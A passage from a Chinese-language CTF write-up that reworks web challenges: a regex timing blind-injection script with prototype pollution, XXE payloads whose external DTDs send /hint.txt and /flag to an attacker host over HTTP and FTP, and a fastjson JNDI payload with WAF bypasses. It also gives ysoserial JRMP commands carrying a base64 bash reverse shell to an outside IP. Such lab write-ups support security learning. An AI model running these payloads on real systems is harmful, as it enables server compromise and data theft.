class="string">'q'</span>: pre + c + suf&#125;)    </span><br><span class="line">    re.append([c, time() - begin])    </span><br><span class="line">    sleep(<span class="number">0.1</span>)    </span><br><span class="line">    print(pre + c + suf)    </span><br><span class="line">    print(len(pre + c + suf))    </span><br><span class="line">    print(r.text)</span><br><span class="line">re = sorted(re, key = <span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> re[::<span class="number">-1</span>][:<span class="number">3</span>]:    </span><br><span class="line">    print(<span class="string">'[*] &#123;&#125; : &#123;&#125;'</span>.format(d[<span class="number">0</span>], d[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200310213622108.png" alt="image-20200310213622108"></p>
<p>用这个脚本跑到盛前面两个的时候，跑不出了。</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200310215446654.png" alt="image-20200310215446654"></p>
<p>然后改下前面的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time,sleep</span><br><span class="line">depth = <span class="number">5</span></span><br><span class="line">suf = <span class="string">']'</span>+<span class="string">'('</span> * depth + <span class="string">'.'</span> + <span class="string">'*)'</span> * depth +<span class="string">'tFLAaGEAxY'</span></span><br><span class="line">pre = <span class="string">'['</span></span><br><span class="line">dict = <span class="string">"&#123;&#125;_0123456789abcdefghijklmnopqestuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span> </span><br><span class="line">re = [] </span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> dict:    </span><br><span class="line">    r=requests.post(<span class="string">'http://127.0.0.1:8081'</span>, json = &#123;<span class="string">"user"</span>: &#123;<span class="string">"username"</span>:<span class="string">"admın888"</span>, <span class="string">"__proto__"</span>: &#123;<span class="string">"enableReg"</span>: <span class="literal">True</span>&#125;&#125;&#125;)    </span><br><span class="line">    begin = time()    </span><br><span class="line">    r=requests.post(<span class="string">'http://127.0.0.1:8081/verifyFlag'</span>, json = &#123;<span class="string">'q'</span>: pre + c + suf&#125;)    </span><br><span class="line">    re.append([c, time() - begin])    </span><br><span class="line">    sleep(<span class="number">0.1</span>)    </span><br><span class="line">    print(pre + c + suf)    </span><br><span class="line">    print(len(pre + c + suf))    </span><br><span class="line">    print(r.text)</span><br><span class="line">re = sorted(re, key = <span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> re[::<span class="number">-1</span>][:<span class="number">3</span>]:    </span><br><span class="line">    print(<span class="string">'[*] &#123;&#125; : &#123;&#125;'</span>.format(d[<span class="number">0</span>], d[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200310215725486.png" alt="image-20200310215725486"></p>
<p>之后又看了syclover的<a href="https://mp.weixin.qq.com/s/RjTsvUsx65YTMIg3jejXng" target="_blank" rel="noopener">wp</a></p>
<blockquote>
<p><code>&quot;^(?=xxx)((.*)*)*aaaaa$&quot;</code>如果匹配到xxx会无限延时，用这个可以盲注flag,结尾不能是aaaaa即可， 无限延迟题目会挂,少一个括号即可 “^(?=xxx)(.<em>)</em>aaaaa$”</p>
<p>偷个图</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/640.webp" alt="img"></p>
</blockquote>
<h1 id="0x02-baby-java"><a href="#0x02-baby-java" class="headerlink" title="0x02 baby java"></a>0x02 baby java</h1><p>这道题目考点是javaxxe和fastjson反序列化的漏洞，首先页面是这样，</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311132610679.png" alt="image-20200311132610679"></p>
<p>很酷炫，然后比赛就是不会做，burp截包可以看到这里用了xml格式来读取输入的数据，可以xxe，</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY  <span class="meta-keyword">xxe</span>  <span class="meta-string">"bbbbb"</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">number</span>&gt;</span>fffff<span class="tag">&lt;/<span class="name">number</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311140115614.png" alt="image-20200311140115614"></p>
<p>可以解析xml，比赛时测试带上&amp;，%就会get out hacker ，以为把&amp;和%都禁了，然后就没有然后了，还是对xxe的理解不够深入，然后继续测试，</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY  <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">"file:///etc/passwd"</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">number</span>&gt;</span>fffff<span class="tag">&lt;/<span class="name">number</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311140602422.png" alt="image-20200311140602422"></p>
<p>这里会触发waf,从这也可以看出，触发waf的时候会返回sus waf detect ! get out bad hacker ! hint: /hint.txt，而之前返回get out hacker 可能时因为语法问题等其他原因，这里过滤了file和ftp等，而且提示我们去读hint.txt，然后尝试外带xxe，<a href="https://www.leadroyal.cn/?p=914" target="_blank" rel="noopener">这里参考</a></p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311140334086.png" alt="image-20200311140334086"></p>
<p>开始看其他的wp上面说有用http读取了hint.txt，而且内容为pom.xml文件，以为是多行的，看了上面这篇文章后，http是不能读多行文件的，然后问了出题人<a href="https://www.cnblogs.com/tr1ple/" target="_blank" rel="noopener">tr1ple</a>师傅，hint.txt是单行的，那么http和ftp应该都可以读了，</p>
<p>这里我们服务器放的hint.txt如下</p>
<img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311141839708.png" alt="image-20200311141839708" style="zoom:200%;">

<ul>
<li>http</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">"http://ip/gx.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">number</span>&gt;</span>fffff<span class="tag">&lt;/<span class="name">number</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//gx.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///hint.txt"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://ip:9999/?%file;'&gt;"</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311141959966.png" alt="image-20200311141959966"></p>
<ul>
<li>ftp</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">"http://ip/gxzy.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">number</span>&gt;</span>fffff<span class="tag">&lt;/<span class="name">number</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//gxzy.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">payload</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://ip:2121/%payload;'&gt;"</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/Inkedimage-20200311142521849_LI-1584922557726.jpg" alt="Inkedimage-20200311142521849_LI"></p>
<p>按照比赛来这时我们得到了pom.xml文件，</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Method%uFF1A post</span><br><span class="line">Path %uFF1A /you_never_know_the_path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.tr1ple<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sus<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>baby_java<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-configuration2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>saxpath<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>saxpath<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-FCS<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-lang<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-lang<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flex.blazeds<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flex-messaging-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.7.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.48<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.vintage<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-vintage-engine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里可以看到有一个/you_never_know_the_path路径，还有1.2.48fastjson,还有这个commons-collections东东，然后查了下fastjson的最近的漏洞，<a href="https://0day.design/2020/01/30/fastjson%20%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">这篇</a>文章具体的分析了漏洞，然后这里就贴出payload，</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"&#125;</span><br></pre></td></tr></table></figure>

<p>然后用这个payload打的话，还是会触发waf,</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311143155288.png" alt="image-20200311143155288"></p>
<p>然后测试发现对type和prefix进行了过滤，从上面那篇文章可以知道</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311143500149.png" alt="image-20200311143500149"></p>
<p>那么就可以通过十六进制绕过type的过滤，然后就是prefix的绕过，</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311144231267.png" alt="image-20200311144231267"></p>
<p><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/#0x04-%E9%A2%98%E5%A4%96%E8%AF%9D" target="_blank" rel="noopener">图片来源</a></p>
<p>然后这里就通过在prefix前面加-来绕过，然后就是在vps上开一个JRMPListener,然后通过fastjson的漏洞触发服务器连接vps的JRMPListener，然后给服务器发送序列化的payload,触发服务器反序列化，最后rce。</p>
<p>payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener  8888 CommonsCollections7 'bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMzQuMjAwLjE1MS81MDAwMCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'</span><br><span class="line">java -cp ysoserial.jar  ysoserial.exploit.JRMPClient  144.34.200.151 7777  CommonsCollections7 'bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMzQuMjAwLjE1MS81MDAwMCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@\x74ype&quot;:&quot;org.apache.commons.configuration.JNDIConfiguration&quot;,&quot;-prefix&quot;:&quot;rmi:&#x2F;&#x2F;ip:8888&#x2F;Exploit&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>成功反弹shell。</p>
<img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311145143273.png" alt="image-20200311145143273" style="zoom:200%;">

<p>另外还有用在vps上开了一个LDAPServer,来反弹shell，由于java还不是太熟，这里没有复现，师傅有会的可以六个链接啥的，教教我这个菜鸡，</p>
<p>参考：<a href="http://ctf.njupt.edu.cn/382.html#hackme" target="_blank" rel="noopener">http://ctf.njupt.edu.cn/382.html#hackme</a></p>
<h1 id="0x03-happy-vacation"><a href="#0x03-happy-vacation" class="headerlink" title="0x03  happy vacation"></a>0x03  happy vacation</h1><p>前一篇文章已经记录了这道题的非预期解，比较简单，这道题的预期解是xss,接下来进行分析，</p>
<p>xss的触发点在index.php</p>
